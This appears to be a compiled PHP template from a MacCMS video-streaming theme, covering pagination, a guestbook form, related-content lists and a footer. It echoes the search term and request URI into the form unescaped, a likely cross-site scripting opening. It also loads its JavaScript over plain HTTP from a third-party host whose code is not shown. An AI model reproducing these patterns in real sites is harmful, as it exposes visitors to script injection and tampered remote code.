	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline<?php if($__PAGING__['page_current']==1): ?> fed-btns-disad<?php endif; ?>" href="<?php echo mac_url_page($__PAGING__['page_url'],1); ?>">首页</a>
	<a class="fed-btns-info fed-rims-info<?php if($__PAGING__['page_current']==1): ?> fed-btns-disad<?php endif; ?>" href="<?php echo mac_url_page($__PAGING__['page_url'],$__PAGING__['page_prev']); ?>">上页</a>
	<?php if($__PAGING__['page_current']>3&&$maccms['aid']!=6): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline" href="<?php echo mac_url_page($__PAGING__['page_url'],1); ?>">1</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline fed-btns-disad" href="javascript:;">...</a>
	<?php endif; if(is_array($__PAGING__['page_num']) || $__PAGING__['page_num'] instanceof \think\Collection || $__PAGING__['page_num'] instanceof \think\Paginator): if( count($__PAGING__['page_num'])==0 ) : echo "" ;else: foreach($__PAGING__['page_num'] as $key=>$num): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline<?php if($__PAGING__['page_current']==$num): ?> fed-btns-green<?php endif; ?>" href="<?php if($__PAGING__['page_current']==$num): ?>javascript:;<?php else: ?><?php echo mac_url_page($__PAGING__['page_url'],$num); endif; ?>"><?php echo $num; ?></a>
	<?php endforeach; endif; else: echo "" ;endif; if($__PAGING__['page_current']<($__PAGING__['page_total']-2)&&$maccms['aid']!=6): ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline fed-btns-disad" href="javascript:;">...</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-sm-inline" href="<?php echo mac_url_page($__PAGING__['page_url'],$__PAGING__['page_total']); ?>"><?php echo $__PAGING__['page_total']; ?></a>
	<?php endif; ?>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline" href="javascript:;"><?php echo $__PAGING__['page_current']; ?>/<?php echo $__PAGING__['page_total']; ?></a>
	<a class="fed-btns-info fed-rims-info<?php if($__PAGING__['page_current']==$__PAGING__['page_total']): ?> fed-btns-disad<?php endif; ?>" href="<?php echo mac_url_page($__PAGING__['page_url'],$__PAGING__['page_next']); ?>">下页</a>
	<a class="fed-btns-info fed-rims-info fed-hide fed-show-xs-inline<?php if($__PAGING__['page_current']==$__PAGING__['page_total']): ?> fed-btns-disad<?php endif; ?>" href="<?php echo mac_url_page($__PAGING__['page_url'],$__PAGING__['page_total']); ?>">尾页</a>
	<?php endif; ?>
	<input class="fed-rims-info" type="text" placeholder="输入页码" autocomplete="off">
    <a class="fed-btns-info fed-rims-info fed-page-jump" data-url="<?php echo $__PAGING__['page_url']; ?>" data-total="<?php echo $__PAGING__['page_total']; ?>" data-sp="<?php echo $__PAGING__['page_sp']; ?>" >跳转</a>
</div>
<?php endif; if($__PAGING__['record_total']!=0): ?>
<script type="text/javascript">
if(document.getElementById('fed-now')) document.getElementById('fed-now').innerHTML='<?php echo $__PAGING__['page_current']; ?>';
if(document.getElementById('fed-count')) document.getElementById('fed-count').innerHTML='<?php echo $__PAGING__['record_total']; ?>';
</script>
<?php endif; if(empty($__PAGING__['record_total']) || (($__PAGING__['record_total'] instanceof \think\Collection || $__PAGING__['record_total'] instanceof \think\Paginator ) && $__PAGING__['record_total']->isEmpty())): ?>
<div class="fed-padding"><h3>很抱歉，暂无相关视频！<h2>请尝试检查搜索词内的<h1>错别字</h1></h2>，如需提醒管理员添加该视频请在下方留言，谢谢！</h3></div>
	<?php endif; ?>
</div>
<?php if(empty($__PAGING__['record_total']) || (($__PAGING__['record_total'] instanceof \think\Collection || $__PAGING__['record_total'] instanceof \think\Paginator ) && $__PAGING__['record_total']->isEmpty())): if($vfedcc['home']['note']['state']): if($maccms['aid']==1): $__TAG__ = '{"num":"1","order":"desc","by":"time","level":"1","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-padding">
		<?php if($vfedcc['home']['note']['value']): ?><?php echo mac_url_content_img($vo['art_content']); else: ?><marquee><?php echo mac_url_content_img($vo['art_content']); ?></marquee><?php endif; ?>
	</div>
</div>
<?php endforeach; endif; else: echo "" ;endif; else: $__TAG__ = '{"num":"1","order":"desc","by":"time","level":"2","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-padding">
		<?php echo mac_url_content_img($vo['art_content']); ?>
	</div>
</div>
<?php endforeach; endif; else: echo "" ;endif; endif; endif; ?>
<div class="fed-part-layout<?php if($maccms['aid']==15): ?> fed-marg-top<?php endif; ?> fed-back-whits">
	<form class="fed-comm-fork fed-comm-form fed-event" data-role="<?php echo $GLOBALS['config']['gbook']['login']; ?>" autocomplete="off" onkeydown="if(event.keyCode==13){return false}">
		<ul class="fed-part-rows">
			<li class="fed-padding fed-col-xs12"><textarea class="fed-form-info fed-rims-info fed-form-area fed-comm-text fed-event" name="gbook_content" cols="40" rows="4" placeholder="输入留言内容"><?php if($maccms['aid']==13): ?>请管理员添加《<?php echo $param['wd']; ?>》，谢谢！<?php elseif($maccms['aid']==4): else: ?>【ID:<?php echo $obj['vod_id']; ?>-名称:<?php echo mac_filter_html($obj['vod_name']); ?><?php echo $obj['vod_play_list'][$param['sid']]['urls'][$param['nid']]['name']; ?>-<?php echo mac_default($obj['vod_play_list'][$param['sid']]['player_info']['show'],'云播放器'); ?>】无法观看请检查修复。<?php echo chr(13); ?><?php echo chr(10); ?>页面地址：<?php echo $maccms['http_type']; ?><?php echo $_SERVER['HTTP_HOST']; ?><?php echo $_SERVER['REQUEST_URI']; endif; ?></textarea></li>
			<li class="fed-padding<?php if($GLOBALS['config']['gbook']['verify']): ?> fed-col-xs12 fed-col-md4<?php else: ?> fed-col-xs9 fed-col-md10<?php endif; ?>">
				<p class="fed-form-info fed-rims-info fed-text-muted">提示：<span class="fed-comm-tips">还可以输入255字</span></p>
			</li>
			<?php if($GLOBALS['config']['gbook']['verify']): ?>
			<li class="fed-padding fed-col-xs6 fed-col-md4"><input class="fed-form-info fed-rims-info fed-comm-veri" type="tel" name="verify" placeholder="验证码" /></li>
			<li class="fed-padding fed-col-xs3 fed-col-md2"><img class="fed-rims-info fed-comm-code" height="40" src="<?php echo mac_url('verify/index'); ?>" data-role="<?php echo mac_url('verify/index'); ?>" title="看不清楚? 换一张！" onClick="this.src=this.src+'?v=<?php echo time(); ?>'" /></li>
			<?php endif; ?>
			<li class="fed-padding fed-col-xs3 fed-col-md2">
				<a class="fed-form-info fed-rims-info fed-btns-info fed-btns-green fed-comm-gbooks">提交</a>
			</li>
		</ul>
	</form>
</div>
<?php if($vfedcc['home']['actor']['state']): $__TAG__ = '{"num":"1","name":"'.$obj['vod_actor'].'","key":"actors","id":"vo"}';$__LIST__ = model("Actor")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $actors = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($actors % 2 );++$actors;endforeach; endif; else: echo "" ;endif; if($actors): ?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">相关明星</h2>
		<ul class="fed-part-tips fed-padding">
			<li><a class="fed-more" href="<?php echo mac_url_actor_index(); ?>">更多</a></li>
		</ul>
	</div>
	<ul class="fed-list-info fed-part-rows">
		<?php $__TAG__ = '{"num":"'.$vfedcc['home']['actor']['value'].'","name":"'.$obj['vod_actor'].'","order":"desc","by":"time","id":"vo","key":"key"}';$__LIST__ = model("Actor")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs4 fed-col-sm3 fed-col-md2<?php if($vfedcc['home']['actor']['value']=='6'&&$key>4): ?> fed-hide-sm fed-show-md-block<?php endif; ?>">
			<a class="fed-list-pics fed-lazy fed-part-2by3" href="<?php echo mac_url_actor_detail($vo); ?>" data-original="<?php echo mac_url_img($vo['actor_pic']); ?>">
	<span class="fed-list-play fed-hide-xs"></span>
	<?php if($vo['actor_score']>0): ?>
	<span class="fed-list-score fed-font-xii fed-back-green"><?php echo $vo['actor_score']; ?></span>
	<?php endif; ?>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo mac_default($vo['actor_remarks'],$vo['actor_hits'].'浏览'); ?></span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_actor_detail($vo); ?>" <?php if($vo['actor_color']): ?> style="color:#<?php echo $vo['actor_color']; ?>!important" <?php endif; ?>><?php echo $vo['actor_name']; ?></a>
<span class="fed-list-desc fed-font-xii fed-visible fed-part-eone fed-text-muted fed-hide-xs fed-show-sm-block">
<?php echo mac_default($vo['actor_area'],'内详'); ?>
</span>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
</div>
<?php endif; endif; if($obj['vod_rel_art']||$obj['art_rel_art']): ?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">关联文章</h2>
		<ul class="fed-part-tips fed-padding">
			<li><a class="fed-more" href="<?php echo mac_url_type($obj['type']); ?>">更多</a></li>
		</ul>
	</div>
	<ul class="fed-list-info fed-list-img fed-part-rows">
		<?php $__TAG__ = '{"num":"4","rel":"'.$obj['vod_rel_art'].'","order":"desc","by":"time","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs6 fed-col-sm4 fed-col-lg3<?php if($key>3): ?> fed-hide-sm fed-show-lg-block<?php endif; ?>">
			<a class="fed-list-pics fed-lazy fed-part-16by9" href="<?php echo mac_url_art_detail($vo); ?>" data-original="<?php echo mac_url_img($vo['art_pic']); ?>">
	<span class="fed-list-play fed-list-arts fed-hide-xs"></span>
	<span class="fed-list-score fed-font-xii fed-back-green"><?php echo mac_filter_html($vo['type']['type_name']); ?></span>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $vo['art_hits']; ?>阅读</span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_art_detail($vo); ?>"<?php if($vo['art_color']): ?> style="color:#<?php echo $vo['art_color']; ?>!important"<?php endif; ?>><?php echo mac_filter_html($vo['art_name']); ?></a>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
</div>
<?php endif; if($obj['vod_rel_vod']||$obj['art_rel_vod']): ?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">关联视频</h2>
		<ul class="fed-part-tips fed-padding">
			<li><a class="fed-more" href="<?php echo mac_url_type($obj['type']); ?>">更多</a></li>
		</ul>
	</div>
	<ul class="fed-list-info fed-part-rows">
		<?php $__TAG__ = '{"num":"'.$vfedcc['rest']['play'].'","rel":"'.$obj['vod_rel_vod'].'","order":"desc","by":"time","id":"vo","key":"key"}';$__LIST__ = model("Vod")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs4 fed-col-sm3 fed-col-md2<?php if($vfedcc['home']['class']['value']=='6'&&$key>4): ?> fed-hide-sm fed-show-md-block<?php endif; ?>">
		<a class="fed-list-pics fed-lazy fed-part-2by3" href="<?php echo mac_url_vod_detail($vo); ?>" data-original="<?php echo mac_url_img($vo['vod_pic']); ?>"<?php if($maccms['aid']==10): ?> style="background-image: url(<?php echo mac_url_img($vo['vod_pic']); ?>);"<?php endif; ?>>
	<span class="fed-list-play fed-hide-xs"></span>
	<?php if($vo['vod_score']>0): ?>
	<span class="fed-list-score fed-font-xii fed-back-green"><?php echo $vo['vod_score']; ?></span>
	<?php endif; ?>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $vo['vod_remarks'].''; ?></span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_vod_detail($vo); ?>" <?php if($vo['vod_color']): ?> style="color:#<?php echo $vo['vod_color']; ?>!important" <?php endif; ?>><?php echo mac_filter_html($vo['vod_name']); ?></a>
<span class="fed-list-desc fed-font-xii fed-visible fed-part-eone fed-text-muted fed-hide-xs fed-show-sm-block">
<?php echo mac_filter_html(mac_default($vo['vod_actor'],$vo['vod_area'].$vo['type']['type_name'])); ?>
</span>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
</div>
<?php endif; if($maccms['aid']==24): if($obj['art_rel_art']==''): ?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">相关资讯</h2>
		<ul class="fed-part-tips fed-padding">
			<li><a class="fed-more" href="<?php echo mac_url_type($obj['type']); ?>">更多</a></li>
		</ul>
	</div>
	<ul class="fed-list-info fed-list-img fed-part-rows">
		<?php $__TAG__ = '{"num":"4","type":"current","order":"desc","by":"hits_day","id":"vo","key":"key"}';$__LIST__ = model("Art")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs6 fed-col-sm4 fed-col-md3<?php if($key>3): ?> fed-hide-sm fed-show-md-block<?php endif; ?>">
			<a class="fed-list-pics fed-lazy fed-part-16by9" href="<?php echo mac_url_art_detail($vo); ?>" data-original="<?php echo mac_url_img($vo['art_pic']); ?>">
	<span class="fed-list-play fed-list-arts fed-hide-xs"></span>
	<span class="fed-list-score fed-font-xii fed-back-green"><?php echo mac_filter_html($vo['type']['type_name']); ?></span>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $vo['art_hits']; ?>阅读</span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_art_detail($vo); ?>"<?php if($vo['art_color']): ?> style="color:#<?php echo $vo['art_color']; ?>!important"<?php endif; ?>><?php echo mac_filter_html($vo['art_name']); ?></a>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
</div>
<?php endif; else: if($obj['vod_rel_vod']==''): ?>
<div class="fed-part-layout fed-back-whits">
	<div class="fed-list-head fed-part-rows fed-padding">
		<h2 class="fed-font-xvi">相关热播</h2>
		<ul class="fed-part-tips fed-padding">
			<li><a class="fed-more" href="<?php if($maccms['aid']==13||$maccms['aid']==23): ?><?php echo mac_url_type('1'); else: ?><?php echo mac_url_type($obj['type']); endif; ?>">更多</a></li>
		</ul>
	</div>
	<?php if(stristr($obj['type_1']['type_name'],'直播')==true||stristr($obj['type']['type_name'],'直播')==true): ?>
	<ul class="fed-list-info fed-list-img fed-part-rows">
		<?php $__TAG__ = '{"num":"'.($vfedcc['rest']['play']==6?4:8).'","type":"current","order":"desc","by":"hits_day","id":"vo","key":"key"}';$__LIST__ = model("Vod")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs6 fed-col-sm4 fed-col-md3<?php if($vfedcc['rest']['play']=='6'&&$key>3): ?> fed-hide-sm fed-show-md-block<?php elseif($vfedcc['rest']['play']=='12'&&$key>6): ?> fed-hide-sm fed-show-md-block<?php endif; ?>">
		<a class="fed-list-pics fed-lazy fed-part-5by3" href="<?php echo mac_url_vod_play($vo,['sid'=>1,'nid'=>1]); ?>" data-original="<?php echo mac_url_img($vo['vod_pic']); ?>">
	<span class="fed-list-play fed-hide-xs"></span>
	<span class="fed-list-score fed-font-xii fed-text-white fed-back-green"><?php echo mac_default($vo['vod_remarks'],$vo['vod_hits'].'播放'); ?></span>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $vo['vod_hits']; ?>播放</span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_vod_detail($vo); ?>"<?php if($vo['vod_color']): ?> style="color:#<?php echo $vo['vod_color']; ?>!important"<?php endif; ?>><?php echo mac_filter_html($vo['vod_name']); ?></a>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
	<?php else: ?>
	<ul class="fed-list-info fed-part-rows">
		<?php $__TAG__ = '{"num":"'.$vfedcc['rest']['play'].'","type":"current","order":"desc","by":"hits_day","id":"vo","key":"key"}';$__LIST__ = model("Vod")->listCacheData($__TAG__); if(is_array($__LIST__['list']) || $__LIST__['list'] instanceof \think\Collection || $__LIST__['list'] instanceof \think\Paginator): $key = 0; $__LIST__ = $__LIST__['list'];if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$vo): $mod = ($key % 2 );++$key;?>
		<li class="fed-list-item fed-padding fed-col-xs4 fed-col-sm3 fed-col-md2<?php if($vfedcc['home']['class']['value']=='6'&&$key>4): ?> fed-hide-sm fed-show-md-block<?php endif; ?>">
		<a class="fed-list-pics fed-lazy fed-part-2by3" href="<?php echo mac_url_vod_detail($vo); ?>" data-original="<?php echo mac_url_img($vo['vod_pic']); ?>"<?php if($maccms['aid']==10): ?> style="background-image: url(<?php echo mac_url_img($vo['vod_pic']); ?>);"<?php endif; ?>>
	<span class="fed-list-play fed-hide-xs"></span>
	<?php if($vo['vod_score']>0): ?>
	<span class="fed-list-score fed-font-xii fed-back-green"><?php echo $vo['vod_score']; ?></span>
	<?php endif; ?>
	<span class="fed-list-remarks fed-font-xii fed-text-white fed-text-center"><?php echo $vo['vod_remarks'].''; ?></span>
</a>
<a class="fed-list-title fed-font-xiv fed-text-center fed-text-sm-left fed-visible fed-part-eone" href="<?php echo mac_url_vod_detail($vo); ?>" <?php if($vo['vod_color']): ?> style="color:#<?php echo $vo['vod_color']; ?>!important" <?php endif; ?>><?php echo mac_filter_html($vo['vod_name']); ?></a>
<span class="fed-list-desc fed-font-xii fed-visible fed-part-eone fed-text-muted fed-hide-xs fed-show-sm-block">
<?php echo mac_filter_html(mac_default($vo['vod_actor'],$vo['vod_area'].$vo['type']['type_name'])); ?>
</span>
		</li>
		<?php endforeach; endif; else: echo "" ;endif; ?>
	</ul>
	<?php endif; ?>
</div>
<?php endif; endif; endif; ?>
</div></div><div class="fed-goto-info">
	<?php if($vfedcc['rest']['share']['state']): ?>
	<a class="fed-goto-share fed-visible fed-text-center fed-back-whits fed-icon-font fed-icon-fenxiang" href="javascript:;"></a>
	<?php endif; if($vfedcc['rest']['theme']['state']): ?>
	<a class="fed-goto-color fed-visible fed-text-center fed-back-whits fed-icon-font fed-icon-fengge fed-event" href="javascript:;"></a>
	<?php endif; ?>
	<a class="fed-goto-toper fed-hidden fed-text-center fed-back-whits fed-icon-font fed-icon-top" href="javascript:;"></a>
</div><script type="text/javascript"> var vfed = { 'path': '<?php echo $maccms['path']; ?>', 'tips': 'BZeaGVpaGVpeXMudG9wPTE1NjcyMzM3MTM=', 'ver': '<?php echo $version; ?>', 'tpl': '<?php echo $maccms['path_tpl']; ?>', 'mid': '<?php echo $maccms['mid']; ?>', 'aid': '<?php echo $maccms['aid']; ?>', 'did': '<?php echo $obj['vod_id']; ?><?php echo $obj['art_id']; ?>', 'sid': '<?php echo $param['sid']; ?>', 'nid': '<?php echo $param['nid']; ?>', 'wap': '<?php echo $maccms['site_wapurl']; ?>', 'mob': '<?php echo $maccms['mob_status']; ?>', 'not': '<?php echo $vfedcc['rest']['note']['value']; ?>' }; </script>
<script src="http://jt.ismicool.cn/ppxystop/js/jquery.js" type="text/javascript" charset="utf-8"></script>
<script src="http://jt.ismicool.cn/ppxystop/js/global.js" type="text/javascript" charset="utf-8"></script>
<?php if($vfedcc['rest']['font']): ?>
<script src="http://jt.ismicool.cn/ppxystop/js/complex.js" type="text/javascript" charset="utf-8" />
<?php endif; if($msg): ?>
<script src="http://jt.ismicool.cn/ppxystop/js/attach.js" type="text/javascript" charset="utf-8"></script>
<?php endif; if($maccms['aid']==6): ?>
<script src="http://jt.ismicool.cn/ppxystop/js/upload.js" type="text/javascript" charset="utf-8"></script>
<script type="text/javascript">fed.myuser.upload('.fed-user-avat', '.fed-user-image');</script>
<?php endif; if(isset($sidebar)): ?>
<script src="http://jt.ismicool.cn/ppxystop/js/sidebar.js?" type="text/javascript" charset="utf-8"></script>
<?php if(!$vfedcc['main']['code']&&$maccms['aid']!=6): ?>
<script type="text/javascript">if(!fed.global.mobile()) fed.module.qrcode(location.href);</script>
<?php else: ?>
<script type="text/javascript">fed.module.qrcode($('.fed-user-visit').val());</script>
<?php endif; endif; if($vfedcc['rest']['coll']['state']): ?>
<script type="text/javascript">fed.global.ajax(vfed.path + 'api.php/timming/index');</script>
<?php endif; if($maccms['aid']==15&&$vfedcc['play']['danmu']): ?>
<script type="text/javascript">if(!fed.cookie.get('fed_danmu'))fed.player.getdan();</script>
<?php endif; if($vfedcc['home']['taoke']['state']&&$maccms['aid']==15||$vfedcc['home']['taoke']['state']&&$maccms['aid']==1): ?>
<script type="text/javascript">fed.module.taoke();</script>
<?php endif; if($vfedcc['rest']['note']['state']): ?>
<script type="text/javascript">fed.module.notice();</script>
<?php endif; if($vfedcc['navs']['node']): ?>
<script type="text/javascript">fed.module.trace();</script>
<?php endif; ?>
<div class="fed-foot-info fed-part-layout fed-back-whits">
	<div class="fed-part-case">
		<p class="fed-text-center fed-text-black"><?php echo $vfedcc['main']['foot']; ?></p>
		<p class="fed-text-center fed-text-black"><?php echo $maccms['site_tj']; ?></p>
		<p class="fed-text-center fed-text-black fed-foot-maps fed-font-size">
			<a class="fed-font-xiv" href="<?php echo mac_url('rss/index'); ?>" target="_blank">RSS订阅</a>
			<span class="fed-font-xiv">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv" href="<?php echo mac_url('rss/baidu'); ?>" target="_blank">百度蜘蛛</a>
			<span class="fed-font-xiv">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv" href="<?php echo mac_url('rss/google'); ?>" target="_blank">谷歌地图</a>
			<span class="fed-font-xiv">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv" href="<?php echo mac_url('rss/sm'); ?>" target="_blank">神马爬虫</a>
			<span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv fed-hide-xs" href="<?php echo mac_url('rss/sogou'); ?>" target="_blank">搜狗蜘蛛</a>
			<span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv fed-hide-xs" href="<?php echo mac_url('rss/so'); ?>" target="_blank">奇虎地图</a>
			<span class="fed-font-xiv fed-hide-xs">&nbsp;-&nbsp;</span>
			<a class="fed-font-xiv fed-hide-xs" href="<?php echo mac_url('rss/bing'); ?>" target="_blank">必应爬虫</a>
		</p>
		<?php if($maccms['site_email']): ?>
		<p class="fed-text-center fed-text-black"><?php echo $maccms['site_email']; ?>&nbsp;&nbsp;&nbsp;<?php echo $maccms['site_icp']; ?></p>
		<?php endif; ?>
	</div>
</div>
</body>
</html><!---